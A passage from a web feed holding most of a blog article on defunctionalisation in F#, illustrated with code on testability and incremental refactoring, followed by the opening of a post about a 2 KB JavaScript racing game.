&lt;p&gt;The trick was to &lt;em&gt;describe what we wanted to do&lt;/em&gt; wherever possible, and then implement that description. Notice the kinship with the initial algebra pattern: in our first attempt, we were careful not to throw away the user’s input (after all, we could have hooked it up so that &lt;code&gt;3+3&lt;/code&gt; was directly &lt;code&gt;6&lt;/code&gt;, rather than &lt;code&gt;CustomTwoArgs((+), Const 3, Const 3)&lt;/code&gt;), but it was only when we defunctionalised the operations that the power of the initial algebra really came into its own.&lt;/p&gt;
&lt;p&gt;Note further that there is no loss of flexibility – we’ve still retained the &lt;code&gt;CustomOneArg&lt;/code&gt; and &lt;code&gt;CustomTwoArgs&lt;/code&gt; cases. (Perhaps we do need this: perhaps the calculator library needs to take arbitrary functions from its consumers, and we genuinely might not be able to describe in advance what the user wants to do.) This goes to show that defunctionalisation can often be done incrementally – you can get significant benefits without completely rearchitecting your program. If after several rounds of defunctionalisation it turns out that the &lt;code&gt;CustomOneArg&lt;/code&gt; and &lt;code&gt;CustomTwoArgs&lt;/code&gt; cases are no longer required, then we can simply delete them and end up with a fully defunctionalised datatype; but if they are required, we can just keep them around and still retain many of the benefits from the rest of the program’s defunctionalisation.&lt;/p&gt;
&lt;p&gt;Remember, this particular instance of the problem is small, contrived, and designed to be easy to understand. The principle does still hold in real life, and indeed one of our most recent internal projects has seen great structural and performance improvements after a couple of rounds of defunctionalising its core in precisely the incremental “identify the things you want to use this library for, and special-case them with unique descriptions” way described above.&lt;/p&gt;
&lt;h3 id=&quot;scope-for-optimisation&quot;&gt;Scope for optimisation&lt;/h3&gt;
&lt;p&gt;The second of the benefits listed above was “keeping as much information as possible, leaving scope to optimise”.&lt;/p&gt;
&lt;p&gt;Initial algebras naturally don’t lose much information; but it’s quite possible to lose the information you need very early in the refinement pipeline. In the toy calculator example, the original attempt (without &lt;code&gt;Sum&lt;/code&gt; or &lt;code&gt;Negate&lt;/code&gt; as distinct cases) made certain optimisations completely impossible.&lt;/p&gt;
&lt;p&gt;For example, it’s true that &lt;code&gt;-(-a) = a&lt;/code&gt; for every integer &lt;code&gt;a&lt;/code&gt;, so we might wish to optimise &lt;code&gt;Negate (Negate e)&lt;/code&gt; down to just &lt;code&gt;e&lt;/code&gt; for any expression &lt;code&gt;e&lt;/code&gt;. But if all we have is &lt;code&gt;OneArgFunction.Custom (_, OneArgFunction.Custom (_, e))&lt;/code&gt;, then we simply can’t do it. Despite the use of an initial algebra, we’ve still lost too much information because of being insufficiently defunctionalised.&lt;/p&gt;
&lt;h3 id=&quot;testability&quot;&gt;Testability&lt;/h3&gt;
&lt;p&gt;The third of the benefits listed was “testability”. This one is easiest to demonstrate, and it’s probably the most tangible way I use these patterns day-to-day.&lt;/p&gt;
&lt;p&gt;Consider a simple, contrived, program that has some validation requirements, and then does one of two different things depending on whether its input was negative.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; writeSmallOddToFile (&lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt; : &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;) : unit =
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt; % &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; then
        failwith &lt;span class=&quot;hljs-string&quot;&gt;&quot;Input did not pass validation: input cannot be even.&quot;&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt; &amp;gt; &lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt; then
        failwith &lt;span class=&quot;hljs-string&quot;&gt;&quot;Input did not pass validation: input cannot be over 100.&quot;&lt;/span&gt;

    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt; &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; then
        printfn &lt;span class=&quot;hljs-string&quot;&gt;&quot;Number was negative: %i&quot;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;
        System&lt;span class=&quot;hljs-variable&quot;&gt;.IO&lt;/span&gt;&lt;span class=&quot;hljs-variable&quot;&gt;.WriteToFile&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;output.txt&quot;&lt;/span&gt;, sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;%i&quot;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;input&lt;/span&gt;)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;How would you typically go about testing this? It’s easy: simply catch and handle the exception in your tests, and mock out the file system. (Of course, the function signature will need to be altered to take a file system as input.)&lt;/p&gt;
&lt;p&gt;But there is a dual approach: using defunctionalisation to push the work forward, into the future. Instead of handing the file system dependency &lt;em&gt;down&lt;/em&gt; into &lt;code&gt;writeSmallOddToFile&lt;/code&gt; from its caller, we have &lt;code&gt;writeSmallOddToFile&lt;/code&gt; hand its desired actions &lt;em&gt;up&lt;/em&gt; into its caller.&lt;/p&gt;
&lt;p&gt;The following example is written rather in longhand to demonstrate the general pattern.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;ValidationError&lt;/span&gt; &lt;/span&gt;=
  | Even &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; int
  | TooBig &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; int

&lt;span class=&quot;hljs-meta&quot;&gt;[&amp;lt;RequireQualifiedAccess&amp;gt;]&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; ValidationError =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; toString (error : ValidationError) =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; error &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | Even i -&amp;gt; sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;Input did not pass validation: input cannot be even.&quot;&lt;/span&gt;
    | TooBig i -&amp;gt; sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;Input did not pass validation: input cannot be over 100.&quot;&lt;/span&gt;

&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;WriteInstruction&lt;/span&gt; &lt;/span&gt;=
  | Print &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; string
  | WriteFile &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; FilePath * string

&lt;span class=&quot;hljs-meta&quot;&gt;[&amp;lt;RequireQualifiedAccess&amp;gt;]&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; WriteInstruction =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; execute (instruction : WriteInstruction) : unit =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; instruction &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | Print s -&amp;gt; printfn s
    | WriteFile (fp, s) -&amp;gt; System.IO.WriteToFile (fp, s)

&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; describe (input : int) : Result&amp;lt;WriteInstruction, ValidationError&amp;gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; input % &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
    Error (Odd input)
  &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; input &amp;gt; &lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
    Error (TooBig input)
  &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; input &amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
      Print (sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;Number was negative: %i&quot;&lt;/span&gt; input)
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;
      WriteFile (System.IO.FilePath &lt;span class=&quot;hljs-string&quot;&gt;&quot;output.txt&quot;&lt;/span&gt;, sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;%i&quot;&lt;/span&gt; input)
    |&amp;gt; Ok

&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; writeSmallOddToFile (input : int) : unit =
  &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; describe input &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
  | Error e -&amp;gt; failwith (ValidationError.toString e)
  | Ok instruction -&amp;gt; WriteInstruction.execute instruction
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Now it is incredibly simple to test the logic of the &lt;code&gt;describe&lt;/code&gt; function: there are no dependencies to mock, so we can simply call the function precisely as it will be called in production. The &lt;code&gt;WriteInstruction.execute&lt;/code&gt; function has similarly been stripped to the bare bones; to test this function, it will be necessary to mock out dependencies (though because the dependencies have been forced as far forward as possible, they are much easier to mock). Succinctly: &lt;em&gt;the logic of deciding how to do things&lt;/em&gt; is completely decoupled from &lt;em&gt;the logic of deciding what to do&lt;/em&gt;, and this separation makes it easier both to test &lt;em&gt;what the program thinks it should do&lt;/em&gt; and &lt;em&gt;how the program thinks it should do it&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;If a more end-to-end test is required, a function &lt;code&gt;WriteInstruction -&amp;gt; unit&lt;/code&gt; could be injected into &lt;code&gt;writeSmallOddToFile&lt;/code&gt;, to be used instead of &lt;code&gt;WriteInstruction.execute&lt;/code&gt;. Note that this looks very similar to the object-orientation-inspired idea of mocking out the filesystem; but mocking an entire filesystem is very much overkill here, giving the caller much less of an idea of how the filesystem dependency is going to be used. By instead having &lt;code&gt;describe&lt;/code&gt; pass its intended actions &lt;em&gt;up&lt;/em&gt; to its caller, and separating the interpretation of those actions in &lt;code&gt;execute&lt;/code&gt;, the requirements are made clear.&lt;/p&gt;

&lt;p&gt;One of the great benefits of defunctionalisation is that it can be introduced gradually to an existing system. When a data structure contains functions that you (the creator of a library) have put there, you can always pull off the following manoeuvre.&lt;/p&gt;
&lt;p&gt;Imagine we have a discriminated union called &lt;code&gt;FunctionalType&lt;/code&gt;, which expresses several possible ways of getting information from the outside world for use in subsequent processing. One of these ways is an &lt;code&gt;InternetRequest&lt;/code&gt;, which takes an integer (say, &lt;code&gt;3&lt;/code&gt;), then requests &lt;code&gt;http://wellknown/3.txt&lt;/code&gt; and checks if that document exists.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;[&amp;lt;Obsolete &quot;Use Defunctionalised instead.&quot;&amp;gt;]&lt;/span&gt;
&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;FunctionalType&lt;/span&gt; &lt;/span&gt;=
  
  
  | InternetRequest &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (int -&amp;gt; bool)
  
  | AnotherCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (string -&amp;gt; float)
  | AThirdCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (unit -&amp;gt; float)

&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Defunctionalising&lt;/span&gt; &lt;/span&gt;=
  | InternetRequest &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; Uri
  | AnotherCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (string -&amp;gt; float)
  | AThirdCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (unit -&amp;gt; float)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Imagine the call site used to look like the following (where I have assumed access to some helper functions in a hypothetical &lt;code&gt;Uri&lt;/code&gt; module, rather than writing out a complete implementation):&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; makeFunctionalType &lt;span class=&quot;hljs-literal&quot;&gt;()&lt;/span&gt; : &lt;span class=&quot;hljs-type&quot;&gt;FunctionalType&lt;/span&gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; remoteFileExists (i : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;) =
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; document : &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; option =
      &lt;span class=&quot;hljs-type&quot;&gt;Uri&lt;/span&gt;.append (&lt;span class=&quot;hljs-type&quot;&gt;Uri&lt;/span&gt;.make &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://wellknown&quot;&lt;/span&gt;) (sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;%i.txt&quot;&lt;/span&gt; i)
      |&amp;gt; &lt;span class=&quot;hljs-type&quot;&gt;Uri&lt;/span&gt;.fetch
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; document &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;None&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;Some&lt;/span&gt; _ -&amp;gt; &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;
  &lt;span class=&quot;hljs-type&quot;&gt;FunctionalType&lt;/span&gt;.&lt;span class=&quot;hljs-type&quot;&gt;InternetRequest&lt;/span&gt; remoteFileExists

&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; doStuff (f : &lt;span class=&quot;hljs-type&quot;&gt;FunctionalType&lt;/span&gt;) (i : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;) =
  &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;FunctionalType&lt;/span&gt;.&lt;span class=&quot;hljs-type&quot;&gt;InternetRequest&lt;/span&gt; (f : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;bool&lt;/span&gt;) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; f i &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0.0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1.0&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;AnotherCase&lt;/span&gt; (f : &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;float&lt;/span&gt;) -&amp;gt;
    f &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello!&quot;&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;AThirdCase&lt;/span&gt; (f : &lt;span class=&quot;hljs-built_in&quot;&gt;unit&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;float&lt;/span&gt;) -&amp;gt;
    f &lt;span class=&quot;hljs-literal&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Then in the new world, it could look like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; makeDefunctionalising () : Defunctionalising =
  Uri.make (&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://wellknown&quot;&lt;/span&gt;)
  |&lt;span class=&quot;hljs-type&quot;&gt;&amp;gt; Defunctionalising&lt;/span&gt;.InternetRequest

&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; doStuff (f : Defunctionalising) (i : int) =
  &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f &lt;span class=&quot;hljs-built_in&quot;&gt;with&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Defunctionalising&lt;/span&gt;.InternetRequest (u : Uri) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; document =
      Uri.append u (sprintf &lt;span class=&quot;hljs-string&quot;&gt;&quot;%i.txt&quot;&lt;/span&gt; i)
      |&lt;span class=&quot;hljs-type&quot;&gt;&amp;gt; Uri&lt;/span&gt;.fetch
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; document &lt;span class=&quot;hljs-built_in&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;None&lt;/span&gt; -&amp;gt; false
    | &lt;span class=&quot;hljs-type&quot;&gt;Some&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;_&lt;/span&gt; -&amp;gt; true
    |&lt;span class=&quot;hljs-type&quot;&gt;&amp;gt; fun&lt;/span&gt; result -&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; result &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0.0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1.0&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Defunctionalising&lt;/span&gt;.AnotherCase (f : string -&amp;gt; float) -&amp;gt;
    // This is unchanged: we haven't defunctionalised it yet
    f &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello!&quot;&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Defunctionalising&lt;/span&gt;.AThirdCase (f : unit -&amp;gt; float) -&amp;gt;
    f ()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This hasn’t actually decreased the complexity: all the same code is present in the old world as in the new world, though some of it has shuffled around. However, this new world enjoys some of the benefits discussed above, and without the need to make sweeping changes to the entire program: we have defunctionalised only one case where it seemed easy to do so.&lt;/p&gt;
&lt;p&gt;Of course, if we would like to keep the &lt;code&gt;doStuff&lt;/code&gt; function short, then we can extract the rearranged code out into its own “interpreting” function with type signature &lt;code&gt;Uri -&amp;gt; (int -&amp;gt; bool)&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;what-about-more-complex-dependencies-&quot;&gt;What about more complex dependencies?&lt;/h2&gt;
&lt;p&gt;Sometimes there may be interdependencies knitted into the structure of your code, such that several DU cases have to be migrated together; but even this is not an insurmountable obstacle. By creating a structure that holds the dependencies, you can make sure you have them whenever you need them; and once all the relevant DU cases have been “nearly defunctionalised” so that they consist of a description and a blob of dependencies, then you can start to move the dependencies out again.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Dependencies&lt;/span&gt; &lt;/span&gt;= Dependencies &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (int ref) * OtherThings

&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Defunctionalising&lt;/span&gt; &lt;/span&gt;=
  
  | InternetRequest &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; Uri
  
  
  
  | AnotherCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; Dependencies
  | AThirdCase &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; Dependencies * bool
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Now, when we come to use the &lt;code&gt;Defunctionalising&lt;/code&gt; type, we can recreate the functions that were previously contained within the &lt;code&gt;FunctionalType&lt;/code&gt;‘s cases, even if there was lots of information shared between those cases. In this example, there is some shared mutable state (the &lt;code&gt;int ref&lt;/code&gt; of the &lt;code&gt;Dependencies&lt;/code&gt; object), which is why we didn’t want to migrate the two cases independently. But we can still move the construction of those functions forward, into the future, constructing them only at the point where they are needed and hence obtaining many of the benefits of defunctionalisation:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; doStuff (f : Defunctionalising) (i : &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;) =
  &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f with
  | Defunctionalising.InternetRequest (u : Uri) -&amp;gt;
    
    failwith &lt;span class=&quot;hljs-string&quot;&gt;&quot;etc.&quot;&lt;/span&gt;
  | Defunctionalising.AnotherCase (Dependencies (sharedState, otherThings)) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; f (s : string) : &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; =
      sharedState := &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;.length s)
      sharedState
    f &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello!&quot;&lt;/span&gt;
  | Defunctionalising.AThirdCase (Dependencies (sharedState, otherThings), b : &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt;) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; f () : &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; =
      sharedState := sharedState + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;.
      sharedState
    f ()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The idea is that instead of having a function which &lt;a href=&quot;https://www.gresearch.co.uk/article/defunctionalisation/closure&quot;&gt;closes over&lt;/a&gt; its dependencies implicitly, we bring those arguments out so they are explicitly represented in the defunctionalised data structure. Then we can get rid of the function itself from our data type, and rehydrate the function later on.&lt;/p&gt;
&lt;p&gt;Once we have manipulated the data structures into this more cleanly separated form (that is, “a blob of stuff the function needs” and “the input to the function”), we could simply stop and consider our job to be done. It’s almost certainly produced a more inspectable, more testable data structure, with nice handy labels for everything that the debugger would previously have had to try its best at disentangling for us (in showing all the variables that had been closed over). Or we could go on and see how far forward in the “compilation pipeline” we can push the computations that create the &lt;code&gt;Dependencies&lt;/code&gt; object.&lt;/p&gt;
&lt;p&gt;For example, we could discover that the &lt;code&gt;sharedState&lt;/code&gt; was actually only ever mutated by the functions contained in these two discriminated-union cases, and that it was safe to create this dependency later, omitting it from the &lt;code&gt;Dependencies&lt;/code&gt; object and therefore making the code simpler (since we can guarantee that nothing else is mutating that shared state):&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Defunctionalising&lt;/span&gt;&lt;/span&gt; =
  
  | InternetRequest of Uri
  
  
  | AnotherCase of OtherThings
  | AThirdCase of OtherThings * &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; doStuff (f : Defunctionalising) (i : &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;) =
  
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; mutable sharedMutableState = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;.
  &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f with
  | Defunctionalising.InternetRequest (u : Uri) -&amp;gt;
    
    failwith &lt;span class=&quot;hljs-string&quot;&gt;&quot;etc.&quot;&lt;/span&gt;
  | Defunctionalising.AnotherCase (deps : OtherThings) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; f (s : string) : &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; =
      sharedMutableState &amp;lt;- &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;.length s)
      sharedMutableState
    f &lt;span class=&quot;hljs-string&quot;&gt;&quot;hello!&quot;&lt;/span&gt;
  | Defunctionalising.AThirdCase (deps : OtherThings, b : &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt;) -&amp;gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; f () : &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; =
      sharedMutableState &amp;lt;- sharedMutableState + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;.
      sharedMutableState
    f ()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It’s entirely up to you to decide how far along the defunctionalisation path you wish to go.&lt;/p&gt;

&lt;p&gt;It really is very hard to express in words how beautiful a “compilation pipeline” of initial algebras can be. Functional programming is in some sense “programming via data”, and while the initial algebra pattern lets you see what you’re going to do, it is only when you add in defunctionalisation to the “compilation pipeline” that the program can truly fall out into layer after layer of pure data transformations.&lt;/p&gt;
&lt;p&gt;Defunctionalisation makes it easier to track the dependencies of your code, and it can simultaneously make your code more amenable to optimisation and more debuggable. Indeed, internally we have used this extra power to help create visualisations of the various stages of “compilation” underlying a particular one of our projects (since at any stage of “compilation” of an initial algebra, you can always choose to interpret your data structure not as a specification of a computation, but as a specification of a visualisation!). If you have never tried working while you have good visualisations of the internals of your programs, I strongly recommend giving it a try; it is mind-expanding.&lt;/p&gt;
&lt;p&gt;Be on the lookout for opportunities to throw away less information, and the data structures will reward you.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Patrick Stevens – Developer&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 09 Mar 2020 13:09:48 +0000</pubDate>
<dc:creator>Smaug123</dc:creator>
<og:type>article</og:type>
<og:title>Defunctionalisation - an underappreciated tool for writing good software | G Research</og:title>
<og:url>https://www.gresearch.co.uk/article/defunctionalisation/</og:url>
<og:image>https://www.gresearch.co.uk/wp-content/uploads/2020/01/img_share.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.gresearch.co.uk/article/defunctionalisation/</dc:identifier>
</item>
<item>
<title>How I made a 3D game in 2 KB of JavaScript</title>
<link>http://frankforce.com/?p=7427</link>
<guid isPermaLink="true" >http://frankforce.com/?p=7427</guid>
<description>&lt;p&gt;&lt;img class=&quot;size-large alignright&quot; src=&quot;https://i.imgur.com/kyjXrea.gif&quot; width=&quot;240&quot; height=&quot;135&quot;/&gt;Months ago, when I heard that the legendary &lt;a href=&quot;https://js1k.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;JS1k game jam&lt;/a&gt; would not be continuing, I talked it over with some other devs and decided to help fill the void we would host &lt;a href=&quot;https://itch.io/jam/2kplus-jam&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;a 2k game jam on itch called 2kPlus Jam&lt;/a&gt;. The primary goal of this comp was to create a game that fits entirely in a 2 kilobyte zip file. That is incredibly small, for point of reference a 3.5 floppy disk could hold over 700 of these games.&lt;/p&gt;
&lt;p&gt;My entry, Hue Jumper, is an homage to 80’s racing game rendering technology. The 3D graphics and physics engine was implemented from scratch in pure JavaScript. I also spent ungodly hours tweaking the gameplay and visuals.&lt;/p&gt;
&lt;p&gt;The theme for the game jam was “Shift” which I incorporated by shifting the hue for the world’s color when the player crosses a checkpoint. I imagined that crossing a checkpoint was fictionally like shifting or jumping into a new dimension with a different hue, which is how I came up with the name “Hue Jumper”.&lt;/p&gt;
